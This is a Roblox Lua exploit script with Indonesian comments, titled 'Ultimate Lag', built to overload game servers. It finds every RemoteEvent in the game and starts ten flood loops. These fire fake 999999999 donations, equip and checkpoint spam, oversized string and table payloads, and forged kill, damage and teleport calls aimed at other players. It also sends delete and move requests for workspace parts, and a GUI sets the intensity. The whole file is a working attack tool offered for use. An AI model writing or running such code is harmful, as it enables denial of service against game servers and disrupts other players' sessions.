-- ALL-IN-ONE LAG MODE - ULTIMATE
-- Target semua mechanics + 60+ remotes
-- BAHASA INDONESIA

task.wait(2)

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui", 10)

if not playerGui then return end

if playerGui:FindFirstChild("UltimateLagGUI") then
    playerGui.UltimateLagGUI:Destroy()
    task.wait(0.5)
end

-- ============================================
-- SETTINGS
-- ============================================
local Settings = {
    Running = false,
    Intensity = 5, -- 1-10
}

-- ============================================
-- VARIABLES
-- ============================================
local allRemotes = {}
local specificRemotes = {
    donated = nil,
    equipTool = nil,
    unequipTool = nil,
    auraEquip = nil,
    donationBoard = nil,
    checkpoint = nil,
    carryRemote = nil,
}
local lagThreads = {}
local totalPackets = 0

-- ============================================
-- NOTIFICATION
-- ============================================
local function notif(msg)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Ultimate Lag";
            Text = msg;
            Duration = 3;
        })
    end)
    print("[Ultimate Lag]", msg)
end

-- ============================================
-- SCAN REMOTES (SMART)
-- ============================================
local function scanAllRemotes()
    allRemotes = {}
    
    notif("🔍 Scanning remotes...")
    
    -- Scan semua services
    for _, service in pairs(game:GetChildren()) do
        pcall(function()
            for _, obj in pairs(service:GetDescendants()) do
                if obj:IsA("RemoteEvent") then
                    table.insert(allRemotes, obj)
                    
                    -- Identify specific remotes
                    local name = obj.Name:lower()
                    if name:find("donat") then
                        specificRemotes.donated = obj
                    elseif name:find("equiptool") then
                        specificRemotes.equipTool = obj
                    elseif name:find("unequiptool") then
                        specificRemotes.unequipTool = obj
                    elseif name:find("aura") and name:find("equip") then
                        specificRemotes.auraEquip = obj
                    elseif name:find("donationboard") then
                        specificRemotes.donationBoard = obj
                    elseif name:find("checkpoint") then
                        specificRemotes.checkpoint = obj
                    elseif name:find("carry") then
                        specificRemotes.carryRemote = obj
                    end
                end
            end
        end)
    end
    
    print("=== SCAN RESULT ===")
    print("Total remotes:", #allRemotes)
    print("Donated:", specificRemotes.donated and "✓" or "✗")
    print("EquipTool:", specificRemotes.equipTool and "✓" or "✗")
    print("AuraEquip:", specificRemotes.auraEquip and "✓" or "✗")
    print("DonationBoard:", specificRemotes.donationBoard and "✓" or "✗")
    print("Checkpoint:", specificRemotes.checkpoint and "✓" or "✗")
    print("===================")
    
    notif("Found " .. #allRemotes .. " remotes!")
    return #allRemotes
end

-- ============================================
-- LAG METHODS - GAME SPECIFIC
-- ============================================

-- Method 1: DONATION FLOOD
local function donationFlood()
    local remote = specificRemotes.donated or specificRemotes.donationBoard
    if not remote then return end
    
    local thread = task.spawn(function()
        notif("💰 Donation flood active!")
        while Settings.Running do
            for i = 1, Settings.Intensity * 20 do
                pcall(function()
                    -- Spam massive donation amounts
                    remote:FireServer(999999999)
                    remote:FireServer({amount = 999999999})
                    remote:FireServer("Donate", 999999999)
                    remote:FireServer({action = "donate", value = 999999999})
                    totalPackets = totalPackets + 4
                end)
            end
            task.wait(0.001)
        end
    end)
    table.insert(lagThreads, thread)
end

-- Method 2: EQUIP/UNEQUIP SPAM LOOP
local function equipSpamLoop()
    local equipRemote = specificRemotes.equipTool
    local unequipRemote = specificRemotes.unequipTool
    
    if not equipRemote and not unequipRemote then return end
    
    local thread = task.spawn(function()
        notif("🎒 Equip spam loop active!")
        while Settings.Running do
            for i = 1, Settings.Intensity * 15 do
                pcall(function()
                    if equipRemote then
                        equipRemote:FireServer()
                        equipRemote:FireServer("Tool")
                        equipRemote:FireServer({tool = "All"})
                    end
                    if unequipRemote then
                        unequipRemote:FireServer()
                        unequipRemote:FireServer("Tool")
                    end
                    totalPackets = totalPackets + 4
                end)
            end
            task.wait(0.001)
        end
    end)
    table.insert(lagThreads, thread)
end

-- Method 3: AURA SPAM
local function auraSpam()
    local remote = specificRemotes.auraEquip
    if not remote then return end
    
    local thread = task.spawn(function()
        notif("✨ Aura spam active!")
        while Settings.Running do
            for i = 1, Settings.Intensity * 10 do
                pcall(function()
                    remote:FireServer()
                    remote:FireServer("Equip")
                    remote:FireServer({action = "equip"})
                    remote:FireServer(true)
                    remote:FireServer(false)
                    totalPackets = totalPackets + 5
                end)
            end
            task.wait(0.001)
        end
    end)
    table.insert(lagThreads, thread)
end

-- Method 4: CHECKPOINT TELEPORT SPAM
local function checkpointSpam()
    local remote = specificRemotes.checkpoint
    if not remote then return end
    
    local thread = task.spawn(function()
        notif("🏁 Checkpoint spam active!")
        while Settings.Running do
            for i = 1, Settings.Intensity * 10 do
                pcall(function()
                    remote:FireServer(math.random(1, 999))
                    remote:FireServer("TP", math.random(1, 999))
                    remote:FireServer({checkpoint = math.random(1, 999)})
                    totalPackets = totalPackets + 3
                end)
            end
            task.wait(0.001)
        end
    end)
    table.insert(lagThreads, thread)
end

-- Method 5: MASSIVE DATA FLOOD (ALL REMOTES)
local function massiveDataFlood()
    local thread = task.spawn(function()
        notif("🌊 Massive data flood active!")
        while Settings.Running do
            for _, remote in ipairs(allRemotes) do
                pcall(function()
                    for i = 1, Settings.Intensity * 5 do
                        -- Send large payloads
                        local bigString = string.rep("LAG", Settings.Intensity * 100)
                        local bigTable = table.create(Settings.Intensity * 100, "OVERLOAD")
                        
                        remote:FireServer(bigString)
                        remote:FireServer(bigTable)
                        remote:FireServer({data = bigString, extra = bigTable})
                        
                        totalPackets = totalPackets + 3
                    end
                end)
            end
            task.wait(0.001)
        end
    end)
    table.insert(lagThreads, thread)
end

-- Method 6: MULTI-PLAYER TARGET SPAM
local function multiPlayerSpam()
    local thread = task.spawn(function()
        notif("🎯 Multi-player spam active!")
        while Settings.Running do
            local allPlayers = Players:GetPlayers()
            
            for _, targetPlayer in ipairs(allPlayers) do
                if targetPlayer ~= player then
                    for i = 1, math.min(#allRemotes, Settings.Intensity * 5) do
                        local remote = allRemotes[i]
                        pcall(function()
                            for j = 1, Settings.Intensity * 3 do
                                local randomPos = Vector3.new(
                                    math.random(-99999, 99999),
                                    math.random(-99999, 99999),
                                    math.random(-99999, 99999)
                                )
                                
                                remote:FireServer("TP", targetPlayer, randomPos)
                                remote:FireServer("Kill", targetPlayer)
                                remote:FireServer("Damage", targetPlayer, 999999)
                                remote:FireServer({action = "kill", player = targetPlayer})
                                remote:FireServer({target = targetPlayer, pos = randomPos})
                                
                                totalPackets = totalPackets + 5
                            end
                        end)
                    end
                end
            end
            task.wait(0.001)
        end
    end)
    table.insert(lagThreads, thread)
end

-- Method 7: WORKSPACE OBJECT SPAM
local function workspaceSpam()
    local thread = task.spawn(function()
        notif("🗺️ Workspace spam active!")
        while Settings.Running do
            local parts = {}
            for _, obj in pairs(Workspace:GetDescendants()) do
                if obj:IsA("BasePart") and #parts < 50 then
                    table.insert(parts, obj)
                end
            end
            
            for _, remote in ipairs(allRemotes) do
                pcall(function()
                    for _, part in ipairs(parts) do
                        for i = 1, Settings.Intensity * 2 do
                            remote:FireServer("Delete", part)
                            remote:FireServer("Edit", part, "Position", Vector3.new(999999, 999999, 999999))
                            remote:FireServer({action = "modify", target = part})
                            
                            totalPackets = totalPackets + 3
                        end
                    end
                end)
            end
            task.wait(0.001)
        end
    end)
    table.insert(lagThreads, thread)
end

-- Method 8: CARRY REMOTE SPAM
local function carrySpam()
    local remote = specificRemotes.carryRemote
    if not remote then return end
    
    local thread = task.spawn(function()
        notif("🤝 Carry spam active!")
        while Settings.Running do
            for i = 1, Settings.Intensity * 10 do
                pcall(function()
                    remote:FireServer()
                    remote:FireServer("Request")
                    remote:FireServer({action = "carry"})
                    remote:FireServer(true)
                    totalPackets = totalPackets + 4
                end)
            end
            task.wait(0.001)
        end
    end)
    table.insert(lagThreads, thread)
end

-- Method 9: MIXED PATTERN CHAOS
local function mixedChaos()
    local thread = task.spawn(function()
        notif("💥 Mixed chaos active!")
        while Settings.Running do
            for _, remote in ipairs(allRemotes) do
                pcall(function()
                    for i = 1, Settings.Intensity * 5 do
                        -- Random patterns
                        remote:FireServer(math.random())
                        remote:FireServer(string.rep("X", Settings.Intensity * 50))
                        remote:FireServer(table.create(Settings.Intensity * 20, "CHAOS"))
                        remote:FireServer(Vector3.new(math.random(), math.random(), math.random()))
                        remote:FireServer({random = math.random(), data = string.rep("Y", 100)})
                        
                        totalPackets = totalPackets + 5
                    end
                end)
            end
            task.wait(0.001)
        end
    end)
    table.insert(lagThreads, thread)
end

-- Method 10: RAPID FIRE ALL REMOTES
local function rapidFireAll()
    local thread = task.spawn(function()
        notif("⚡ Rapid fire active!")
        while Settings.Running do
            for _, remote in ipairs(allRemotes) do
                pcall(function()
                    for i = 1, Settings.Intensity * 10 do
                        remote:FireServer("SPAM")
                        totalPackets = totalPackets + 1
                    end
                end)
            end
            task.wait(0.001)
        end
    end)
    table.insert(lagThreads, thread)
end

-- ============================================
-- MAIN FUNCTIONS
-- ============================================

local function startLag()
    if Settings.Running then
        notif("❌ Sudah berjalan!")
        return
    end
    
    Settings.Running = true
    totalPackets = 0
    
    local remoteCount = scanAllRemotes()
    
    if remoteCount == 0 then
        notif("❌ Tidak ada remote!")
        Settings.Running = false
        return
    end
    
    notif("🔥 ULTIMATE LAG START!")
    notif("Intensity: " .. Settings.Intensity .. "/10")
    notif("Remotes: " .. remoteCount)
    
    print("================================")
    print("ULTIMATE LAG MODE ACTIVATED")
    print("Intensity:", Settings.Intensity)
    print("Total Remotes:", remoteCount)
    print("================================")
    
    -- Launch ALL methods
    task.spawn(donationFlood)
    task.wait(0.05)
    task.spawn(equipSpamLoop)
    task.wait(0.05)
    task.spawn(auraSpam)
    task.wait(0.05)
    task.spawn(checkpointSpam)
    task.wait(0.05)
    task.spawn(massiveDataFlood)
    task.wait(0.05)
    task.spawn(multiPlayerSpam)
    task.wait(0.05)
    task.spawn(workspaceSpam)
    task.wait(0.05)
    task.spawn(carrySpam)
    task.wait(0.05)
    task.spawn(mixedChaos)
    task.wait(0.05)
    task.spawn(rapidFireAll)
    
    notif("💣 10 METHODS ACTIVE!")
    notif("⚠️ SERVER OVERLOADING...")
    
    -- Stats monitor
    task.spawn(function()
        local startTime = tick()
        while Settings.Running do
            task.wait(3)
            local elapsed = math.floor(tick() - startTime)
            local rate = math.floor(totalPackets / math.max(elapsed, 1))
            print(string.format("[Stats] %ds | Packets: %d | Rate: %d/s", elapsed, totalPackets, rate))
        end
    end)
end

local function stopLag()
    if not Settings.Running then
        notif("❌ Tidak sedang berjalan!")
        return
    end
    
    Settings.Running = false
    
    for _, thread in pairs(lagThreads) do
        pcall(function()
            task.cancel(thread)
        end)
    end
    
    lagThreads = {}
    
    notif("⏸️ LAG STOPPED!")
    notif("Total packets: " .. totalPackets)
    
    print("================================")
    print("LAG STOPPED")
    print("Total packets sent:", totalPackets)
    print("================================")
end

-- ============================================
-- CREATE GUI
-- ============================================

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "UltimateLagGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = playerGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 360, 0, 420)
MainFrame.Position = UDim2.new(0.5, -180, 0.5, -210)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 15)
Corner.Parent = MainFrame

-- Header
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 55)
Header.BackgroundColor3 = Color3.fromRGB(255, 0, 100)
Header.BorderSizePixel = 0
Header.Parent = MainFrame

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 15)
HeaderCorner.Parent = Header

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -70, 1, 0)
Title.Position = UDim2.new(0, 15, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "🔥 ULTIMATE LAG"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 22
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 50, 0, 50)
CloseBtn.Position = UDim2.new(1, -53, 0, 2.5)
CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 50)
CloseBtn.Text = "✕"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 24
CloseBtn.Parent = Header

local CloseBtnCorner = Instance.new("UICorner")
CloseBtnCorner.CornerRadius = UDim.new(0, 10)
CloseBtnCorner.Parent = CloseBtn

CloseBtn.MouseButton1Click:Connect(function()
    stopLag()
    ScreenGui:Destroy()
end)

-- Content
local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, -30, 1, -70)
Content.Position = UDim2.new(0, 15, 0, 60)
Content.BackgroundTransparency = 1
Content.Parent = MainFrame

-- Intensity Slider Label
local IntensityLabel = Instance.new("TextLabel")
IntensityLabel.Size = UDim2.new(1, 0, 0, 35)
IntensityLabel.Position = UDim2.new(0, 0, 0, 0)
IntensityLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
IntensityLabel.Text = "⚡ INTENSITY: " .. Settings.Intensity .. "/10"
IntensityLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
IntensityLabel.Font = Enum.Font.GothamBold
IntensityLabel.TextSize = 16
IntensityLabel.Parent = Content

local IntensityLabelCorner = Instance.new("UICorner")
IntensityLabelCorner.CornerRadius = UDim.new(0, 10)
IntensityLabelCorner.Parent = IntensityLabel

-- Intensity Buttons
local btnY = 45
for i = 1, 10 do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.18, 0, 0, 35)
    btn.Position = UDim2.new((i-1) % 5 * 0.2, 0, 0, btnY + math.floor((i-1) / 5) * 45)
    
    local color
    if i <= 3 then
        color = Color3.fromRGB(0, 200, 100)
    elseif i <= 6 then
        color = Color3.fromRGB(255, 200, 0)
    elseif i <= 8 then
        color = Color3.fromRGB(255, 100, 0)
    else
        color = Color3.fromRGB(255, 0, 0)
    end
    
    btn.BackgroundColor3 = color
    btn.Text = tostring(i)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 18
    btn.Parent = Content
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = btn
    
    btn.MouseButton1Click:Connect(function()
        if not Settings.Running then
            Settings.Intensity = i
            IntensityLabel.Text = "⚡ INTENSITY: " .. i .. "/10"
            notif("Intensity set to " .. i)
        else
            notif("Stop dulu sebelum ganti!")
        end
    end)
end

-- Start Button
local StartBtn = Instance.new("TextButton")
StartBtn.Size = UDim2.new(1, 0, 0, 70)
StartBtn.Position = UDim2.new(0, 0, 0, 145)
StartBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
StartBtn.Text = "🚀 START LAG"
StartBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
StartBtn.Font = Enum.Font.GothamBold
StartBtn.TextSize = 24
StartBtn.Parent = Content

local StartBtnCorner = Instance.new("UICorner")
StartBtnCorner.CornerRadius = UDim.new(0, 12)
StartBtnCorner.Parent = StartBtn

StartBtn.MouseButton1Click:Connect(function()
    startLag()
    StartBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    StartBtn.Text = "🔥 LAGGING..."
end)

-- Stop Button
local StopBtn = Instance.new("TextButton")
StopBtn.Size = UDim2.new(1, 0, 0, 60)
StopBtn.Position = UDim2.new(0, 0, 0, 225)
StopBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
StopBtn.Text = "⏸️ STOP LAG"
StopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
StopBtn.Font = Enum.Font.GothamBold
StopBtn.TextSize = 20
StopBtn.Parent = Content

local StopBtnCorner = Instance.new("UICorner")
StopBtnCorner.CornerRadius = UDim.new(0, 12)
StopBtnCorner.Parent = StopBtn

StopBtn.MouseButton1Click:Connect(function()
    stopLag()
    StartBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
    StartBtn.Text = "🚀 START LAG"
end)

-- Info
local Info = Instance.new("TextLabel")
Info.Size = UDim2.new(1, 0, 0, 60)
Info.Position = UDim2.new(0, 0, 1, -60)
Info.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Info.TextColor3 = Color3.fromRGB(220, 220, 220)
Info.Font = Enum.Font.Gotham
Info.TextSize = 11
Info.TextWrapped = true
Info.Text = [[🔥 10 LAG METHODS:
Donation • Equip Loop • Aura • Checkpoint
Data Flood • Multi-Target • Workspace
Carry • Mixed Chaos • Rapid Fire

Cek stats di F9 console!]]
Info.Parent = Content

local InfoPadding = Instance.new("UIPadding")
InfoPadding.PaddingTop = UDim.new(0, 8)
InfoPadding.PaddingLeft = UDim.new(0, 8)
InfoPadding.PaddingRight = UDim.new(0, 8)
InfoPadding.Parent = Info

local InfoCorner = Instance.new("UICorner")
InfoCorner.CornerRadius = UDim.new(0, 10)
InfoCorner.Parent = Info

notif("🔥 Ultimate Lag loaded!")
print("================================")
print("ALL-IN-ONE LAG MODE")
print("10 methods ready!")
print("PlaceId:", game.PlaceId)
print("================================")
